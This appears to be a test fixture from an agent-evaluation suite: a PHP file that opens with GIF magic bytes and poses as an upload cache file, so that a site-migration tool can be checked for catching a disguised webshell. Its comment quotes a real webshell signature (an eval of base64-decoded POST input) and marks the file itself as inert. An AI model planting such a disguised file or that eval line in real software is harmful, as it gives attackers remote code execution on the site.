GIF89a
<?php
// ZAVORA'S FIXTURE, GAUNTLET ATTACK 6 (docs/04-vultr-agent-rush.md §3): a planted "webshell"
// disguised as a cache file in uploads. Its first bytes are GIF magic, so its contents claim an
// image while its name says PHP: an executable/MIME mismatch the Move must catch and never copy.
// INERT: it reads no input and runs nothing. The signature a real one carries is kept inside
// this comment so it never executes:   @eval(base64_decode($_POST['k']));
// Adapted from adk-rust's examples/website `infected` overlay (uploads/2026/10/cache.php).
